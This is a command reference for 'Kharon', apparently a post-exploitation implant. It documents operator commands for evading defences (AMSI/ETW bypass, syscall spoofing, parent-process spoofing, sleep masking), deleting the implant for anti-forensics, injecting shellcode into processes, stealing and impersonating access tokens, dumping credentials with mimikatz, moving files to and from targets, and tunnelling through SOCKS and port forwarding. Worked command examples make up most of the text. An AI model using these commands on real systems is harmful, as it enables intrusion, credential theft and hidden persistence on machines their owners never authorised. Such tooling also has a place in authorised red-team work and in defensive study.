# Kharon Commands Reference

This document provides a complete reference for all available commands in the Kharon agent.

---

## Table of Contents

- [Information](#information)
  - [info](#info)
- [Configuration](#configuration)
  - [config](#config)
- [Session Management](#session-management)
  - [exit](#exit)
  - [selfdel](#selfdel)
- [Execution](#execution)
  - [execute](#execute)
- [Filesystem](#filesystem)
  - [fs](#fs)
- [Process Management](#process-management)
  - [process](#process)
- [File Transfer](#file-transfer)
  - [upload](#upload)
  - [download](#download)
- [Injection](#injection)
  - [scinject](#scinject)
- [Token Management](#token-management)
  - [token](#token)
- [Network](#network)
  - [socks](#socks)
  - [rportfwd](#rportfwd)

---

## Information

### info

Displays detailed information about the target machine, session, and beacon configuration.

**Usage:**
```
info
```

**Output Sections:**

| Section | Description |
|---------|-------------|
| **Session Information** | Agent ID, image name/path, PID, TID, elevation status, architecture |
| **Timing Configuration** | Sleep time and jitter percentage |
| **Evasion Techniques** | Mask beacon, heap mask, gadgets, syscall method, AMSI/ETW bypass |
| **Process Spawning** | Parent PID, block DLLs, spawn to path, fork pipe |
| **Killdate Configuration** | Killdate status, exit type, self delete option |
| **Worktime Configuration** | Activity hours configuration |
| **Guardrails** | IP, hostname, username, and domain restrictions |
| **System Information** | Username, computer name, domain, IP, OS version, processor info |
| **Memory Information** | RAM usage statistics, page size, allocation granularity |
| **Security Features** | CFG, DSE, VBS/HVCI status |

**Example Output:**
```
kharon > info
[xx/xx xx:xx:xx] [*] Kharon config informations:
┌───────────────────────────┬────────────────────────────────────────────────────┐
│                              SESSION INFORMATION                               │
├───────────────────────────┼────────────────────────────────────────────────────┤
│ Agent ID                  │ 3a51d3be                                           │
│ Image Name                │ Kharon.x64.exe                                     │
│ Image Path                │ D:\Kharon.x64.exe                                  │
│ Command Line              │ D:\Kharon.x64.exe                                  │
│ Process ID                │ 31656                                              │
│ Thread ID                 │ 42424                                              │
│ Parent ID                 │ 40392                                              │
│ Elevated                  │ False                                              │
│ Process Arch              │ 0x64                                               │
│ Heap Handle               │ 0x0000029E5C710000                                 │
│ Kharon in-memory base     │ 0x7ff782c71020                                     │
│ Kharon in-memory Size     │ 101680 bytes                                       │
│ Code Page (ACP)           │ 1252                                               │
│ OEM Code Page             │ 437                                                │
├───────────────────────────┼────────────────────────────────────────────────────┤
│                              TIMING CONFIGURATION                              │
├───────────────────────────┼────────────────────────────────────────────────────┤
│ Sleep Time                │ 3000 ms                                            │
│ Jitter                    │ 0%                                                 │
├───────────────────────────┼────────────────────────────────────────────────────┤
│                               EVASION TECHNIQUES                               │
├───────────────────────────┼────────────────────────────────────────────────────┤
│ Mask Beacon               │ None                                               │
│ Heap Mask                 │ False                                              │
│ Jump Gadget               │ 0x7ffd58f38c63                                     │
│ NtContinue Gadget         │ 0x7ffd58fa8ef3                                     │
│ BOF API Proxy             │ False                                              │
│ Syscall Method            │ None                                               │
│ AMSI/ETW Bypass           │ None                                               │
├───────────────────────────┼────────────────────────────────────────────────────┤
│                                PROCESS SPAWNING                                │
├───────────────────────────┼────────────────────────────────────────────────────┤
│ Parent PID                │ 0                                                  │
│ Block DLLs                │ False                                              │
│ Spawn To                  │ C:\Windows\System32\notapad.exe                    |
| Fork Pipe                 │ \\.\pipe\kharon_pipe                               │
├───────────────────────────┼────────────────────────────────────────────────────┤
│                             KILLDATE CONFIGURATION                             │
├───────────────────────────┼────────────────────────────────────────────────────┤
│ Use Killdate              │ False                                              │
│ Exit Type                 │ Exit Process                                       │
│ Self Delete               │ False                                              │
│ Killdate                  │ 01/01/2025                                         │
├───────────────────────────┼────────────────────────────────────────────────────┤
│                             WORKTIME CONFIGURATION                             │
├───────────────────────────┼────────────────────────────────────────────────────┤
│ Enable Worktime           │ False                                              │
│ Start Time                │ 00:00                                              │
│ End Time                  │ 00:00                                              │
├───────────────────────────┼────────────────────────────────────────────────────┤
│                                   GUARDRAILS                                   │
├───────────────────────────┼────────────────────────────────────────────────────┤
│ IP Address                │                                                    │
│ Hostname                  │                                                    │
│ Username                  │                                                    │
│ Domain                    │                                                    │
├───────────────────────────┼────────────────────────────────────────────────────┤
│                               SYSTEM INFORMATION                               │
├───────────────────────────┼────────────────────────────────────────────────────┤
│ Username                  │ DARKSTAR                                           │
│ Computer Name             │ DESKTOP-NJFOEJD                                    │
│ NetBIOS Name              │ DESKTOP-NJFOEJD                                    │
│ Domain                    │                                                    │
│ IP Address                │ 192.168.1.4                                        │
│ OS Architecture           │ 0x64                                               │
│ OS Version                │ 10.0.26200                                         │
│ Processor Name            │ AMD Ryzen 7 5700X 8-Core Processor                 │
│ Processor Count           │ 16                                                 │
├───────────────────────────┼────────────────────────────────────────────────────┤
│                               MEMORY INFORMATION                               │
├───────────────────────────┼────────────────────────────────────────────────────┤
│ Total RAM                 │ 32693 MB                                           │
│ Available RAM             │ 5273 MB                                            │
│ Used RAM                  │ 27420 MB                                           │
│ RAM Usage                 │ 83%                                                │
│ Page Size                 │ 4096 bytes                                         │
│ Allocation Granularity    │ 65536 bytes                                        │
├───────────────────────────┼────────────────────────────────────────────────────┤
│                               SECURITY FEATURES                                │
├───────────────────────────┼────────────────────────────────────────────────────┤
│ CFG Enabled               │ False                                              │
│ DSE Status                │ Enabled                                            │
│ VBS/HVCI                  │ Enabled                                            │
│ Test Signing              │ False                                              │
│ Debug Mode                │ False                                              │
│ Secure Boot               │ False                                              │
└───────────────────────────┴────────────────────────────────────────────────────┘

```

---

## Configuration

### config

Modifies Kharon's runtime behavior and settings.

| Subcommand | Description |
|------------|-------------|
| `sleep` | Changes the interval between callbacks |
| `jitter` | Changes the jitter percentage for sleep time randomization |
| `ppid` | Configures the parent process ID for Kharon-spawned processes |
| `blockdlls` | Blocks non-Microsoft DLLs from loading in spawned processes |
| `worktime` | Configures daily callback activity hours |
| `killdate.date` | Sets the date for Kharon to terminate execution |
| `killdate.exit` | Sets the exit method when Kharon stops: `thread` or `process` |
| `killdate.selfdel` | Configures Kharon to delete its PE from disk on exit |
| `mask.heap` | Enables/disables heap encryption during sleep time |
| `mask.beacon` | Defines the masking method: `timer` or `none` |
| `amsi_etw_bypass` | Configures AMSI/ETW bypass for commands like `dotnet`, options: ``all``, ``etw``, ``amsi`` or ``none`` |
| `spawnto` | Configures the process to spawn for `postex` fork method |
| `syscall` | Selects syscall method: `spoof`, `spoof_indirect`, or `none` |
| `bof_api_proxy` | Enables/disables BOF API proxy |

**Examples:**
```
config sleep 5000
config jitter 20
config ppid 1234
config blockdlls true
config worktime 09:00 18:00
config killdate.date 31/12/2025
config killdate.exit process
config killdate.selfdel true
config mask.heap true
config mask.beacon timer
config amsi_etw_bypass all
config spawnto C:\Windows\System32\svchost.exe
config syscall spoof_indirect
config bof_api_proxy true
```

---

## Session Management

### exit

Terminates the Kharon agent execution.

| Option | Description |
|--------|-------------|
| `process` | Terminates the entire process |
| `thread` | Terminates only the agent thread |

**Usage:**
```
exit <process|thread>
```

**Examples:**
```
exit process
exit thread
```

---

### selfdel

Deletes the Kharon executable file from disk. Useful for cleanup and anti-forensics.

**Usage:**
```
selfdel
```

---

## Execution

### execute

Executes Beacon Object Files (BOF) and shellcode-based post-exploitation modules.

| Subcommand | Description |
|------------|-------------|
| `bof` | Execute a Beacon Object File |
| `postex` | Execute shellcode post-exploitation module |

**Usage:**

| Argument | Type | Required | Default | Description |
|----------|------|----------|---------|-------------|
| `-m` | STRING | No | `inline` | Execution method: `inline` (current process) or `fork` (new/existing process) |
| `-t` | STRING | No | `none` | Fork type: `spawn` (new process) or `explicit` (existing PID) |
| `-p` | INT | No | `0` | Target PID for explicit fork injection |
| `-f` | FILE | Yes | - | Path to shellcode file |
| `-a` | STRING | Yes | - | Shellcode parameters |

**Examples:**
```
execute postex -m inline -t none -p 0 -f /tmp/module.bin -a params
execute postex -f /tmp/mimikatz.bin -a "sekurlsa::logonpasswords"
execute postex -m fork -t spawn -f /tmp/payload.bin -a args
execute postex -m fork -t explicit -p 1234 -f /tmp/payload.bin -a args
```

---

## Filesystem

### fs

Filesystem operations for managing files and directories.

| Subcommand | Description |
|------------|-------------|
| `pwd` | Display the current working directory path |
| `cd` | Change the current working directory |
| `ls` | List files and directories in the specified path |
| `cat` | Display the contents of a file |
| `mkdir` | Create a new directory |
| `cp` | Copy a file from source to destination |
| `mv` | Move or rename a file |
| `rm` | Delete a file from the filesystem |

**Examples:**
```
fs pwd
fs cd C:\Users\Admin
fs ls C:\Temp
fs cat C:\Temp\config.txt
fs mkdir C:\Temp\NewFolder
fs cp C:\source.txt C:\dest.txt
fs mv C:\old.txt C:\new.txt
fs rm C:\Temp\file.txt
```

---

## Process Management

### process

Interact with system processes.

| Subcommand | Description |
|------------|-------------|
| `list` | Display all running processes |
| `kill` | Terminate a process by its PID |
| `run` | Execute a new process with specified parameters |

---

#### process list

Display all running processes on the system.

**Usage:**
```
process list
```

---

#### process kill

Terminate a process by its Process ID (PID).

**Usage:**
```
process kill <pid> [exit_code]
```

| Argument | Type | Required | Description |
|----------|------|----------|-------------|
| `pid` | INT | Yes | Process ID to terminate |
| `exit_code` | INT | No | Exit code for the terminated process |

**Examples:**
```
process kill 1234
process kill 1234 0
```

---

#### process run

Execute a new process with specified command line and optional parameters.

**Usage:**
```
process run <--command cmd> [options]
```

| Argument | Type | Required | Description |
|----------|------|----------|-------------|
| `--command` | STRING | Yes | Full command line with arguments |
| `--state` | STRING | No | Process creation state: `suspended` or `standard` |
| `--pipe` | STRING | No | Capture output via pipe: `true` or `false` |
| `--domain` | STRING | No | Domain for `CreateProcessWithLogon` |
| `--username` | STRING | No | Username for `CreateProcessWithLogon` |
| `--password` | STRING | No | Password for `CreateProcessWithLogon` |
| `--token` | STRING | No | Token handle for `CreateProcessWithToken` |

**Examples:**
```
process run --command "cmd.exe /c whoami /all"
process run --command "notepad.exe" --state suspended
process run --command "cmd.exe /c dir" --pipe true
process run --command "powershell.exe" --domain CORP --username admin --password Secret123
```

---

## File Transfer

### upload

Upload a file from the local machine to the target system.

**Usage:**
```
upload <local_file> [remote_path]
```

| Argument | Type | Required | Description |
|----------|------|----------|-------------|
| `local_file` | FILE | Yes | Path to the local file to upload |
| `remote_path` | STRING | No | Destination path on the target system |

**Example:**
```
upload /tmp/file.txt C:\Temp\file.txt
```

---

### download

Download a file from the target system to the local machine.

**Usage:**
```
download [remote_path]
```

| Argument | Type | Required | Description |
|----------|------|----------|-------------|
| `remote_path` | STRING | No | Path to the file on the target system |

**Example:**
```
download C:\Temp\file.txt
```

---

## Injection

### scinject

Inject raw shellcode into a target process by PID.

**Usage:**
```
scinject <pid> <shellcode_file>
```

| Argument | Type | Required | Description |
|----------|------|----------|-------------|
| `pid` | INT | Yes | Target process ID for injection |
| `shellcode_file` | FILE | Yes | Path to the shellcode file |

**Example:**
```
scinject 1234 payload.bin
```

---

## Token Management

### token

Access token management for privilege escalation and impersonation.

| Subcommand | Description |
|------------|-------------|
| `getuid` | Display the username associated with the current access token |
| `list` | List all stored tokens |
| `steal` | Steal and optionally use an access token from a target process |
| `impersonate` | Apply a previously stolen access token from storage |
| `rm` | Remove an access token from storage |
| `revert` | Restore the original access token |
| `make` | Create an impersonation token using provided credentials |
| `privget` | Retrieve detailed privileges of the current token |
| `privlist` | List all privileges associated with the current token |

**Examples:**
```
token getuid
token list
token steal 1234
token impersonate 0
token rm 0
token revert
token make --domain CORP --username admin --password Secret123
token privget
token privlist
```

**Demo:**

![token_demo](../assets/token-demo.png)

---

## Network

### socks

Manage SOCKS5 proxy tunnels through the agent.

| Subcommand | Description |
|------------|-------------|
| `start` | Start a SOCKS5 proxy server and listen on a specified port |
| `stop` | Stop a SOCKS proxy server |

**Examples:**
```
socks start 1080
socks stop
```

---

### rportfwd

Manage remote port forwarding through the agent.

| Subcommand | Description |
|------------|-------------|
| `start` | Start remote port forwarding from agent via server |
| `stop` | Stop remote port forwarding |

**Examples:**
```
rportfwd start <local_port> <remote_host> <remote_port>
rportfwd stop
```

---

## Quick Reference

| Category | Command | Description |
|----------|---------|-------------|
| Info | `info` | Display session and system information |
| Config | `config sleep` | Set callback interval |
| Config | `config jitter` | Set sleep randomization |
| Config | `config ppid` | Set parent PID for spawned processes |
| Config | `config blockdlls` | Block non-Microsoft DLLs |
| Config | `config worktime` | Set activity hours |
| Config | `config killdate.*` | Configure termination settings |
| Config | `config mask.*` | Configure evasion masking |
| Config | `config syscall` | Set syscall method |
| Config | `config spawnto` | Set spawn process path |
| Session | `exit` | Terminate agent execution |
| Session | `selfdel` | Delete agent from disk |
| Execution | `execute bof` | Run Beacon Object File |
| Execution | `execute postex` | Run shellcode post-ex module |
| Filesystem | `fs pwd/cd/ls/cat/mkdir/cp/mv/rm` | File operations |
| Process | `process list` | List running processes |
| Process | `process kill` | Terminate process by PID |
| Process | `process run` | Execute new process |
| Transfer | `upload` | Upload file to target |
| Transfer | `download` | Download file from target |
| Injection | `scinject` | Inject shellcode into process |
| Token | `token getuid` | Show current user |
| Token | `token steal/impersonate/revert` | Token manipulation |
| Token | `token make` | Create token with credentials |
| Token | `token privget/privlist` | Token privilege info |
| Network | `socks start/stop` | SOCKS5 proxy management |
| Network | `rportfwd start/stop` | Remote port forwarding |